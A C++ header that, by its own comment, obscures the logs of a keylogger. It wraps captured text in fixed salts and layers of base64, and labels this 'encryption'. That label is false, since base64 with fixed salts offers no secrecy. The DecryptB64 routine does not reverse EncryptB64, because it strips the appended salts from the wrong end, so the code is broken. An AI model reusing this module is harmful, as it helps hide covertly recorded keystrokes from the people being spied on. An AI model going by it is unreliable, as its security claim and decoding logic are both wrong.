//cpp file for encryption of the keylogs
#ifndef BASE64_H
#define BASE64_H
#include <vector>
#include <string>

//implementing base64 encoding
namespace Base64
{
    std::string base64_encode(const std::string &);
    std::string base64_decode(const std::string &);
    const std::string &SALT1 = "LM::TB::BB";
    const std::string &SALT2 = "_:/_77";
    const std::string &SALT3 = "line=wowC++";

    std::string EncryptB64(std::string s)
    {
        s = SALT1 + s + SALT2 + SALT3;
        s = base64_encode(s);
        s.insert(7,SALT3);
        s += SALT1;
        s = base64_encode(s);
        s += SALT1 + SALT2 + SALT3;
        s = base64_encode(s);
        s.insert(1,"L");
        s.insert(7,"M");
        return s;
    }

    std::string DecryptB64(std::string s)
{
    s = s.erase(7,1);
    s = s.erase(1, 1);
    s = base64_decode(s);
    s = s.substr(SALT2.length() + SALT3.length());
    s = s.substr(0, s.length() - SALT1.length());
    s = base64_decode(s);
    s = s.substr(0, s.length() - SALT1.length());
    s = s.erase(7, SALT3.length());
    s = base64_decode(s);
    s = s.substr(SALT1.length());
    s = s.substr(0, s.length() - SALT2.length() - SALT3.length());
    return s;
}

    const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

    std::string base64_encode(const std::string &s)
    {
        std::string enc;
        int val = 0;
        int bits = -6;
        const unsigned int b63 = 0x3F;
        for(char c: s)
        {
            val = (val<<8) + c;
            bits += 8;
            while(bits >= 0)
            {
                enc.push_back(BASE64_CODES[(val >> bits) & b63]);
                bits -= 6;
            }
        }
        if(bits>-6)
        {
            enc.push_back(BASE64_CODES[((val << 8) >> (bits + 8)) & b63]);
        }
        while(enc.size() % 4)
        {
            enc.push_back('=');
        }
        return enc;
    }

    std::string base64_decode(const std::string &s)
    {
        std::string dec;
        std::vector<int> v(256, -1);
        for(int i=0; i<64; i++)
        {
            v[BASE64_CODES[i]] = i;
        }
        int val = 0, bits = -8;
        for(const auto &c: s)
        {
            if(v[c] == -1)
            break;
            val = (val << 6) + v[c];
            bits += 6;
            if(bits >= 0)
            {
                dec.push_back(char((val >> bits) & 0xFF));
                bits -= 8;
            }
        }
        return dec;
    }
}
#endif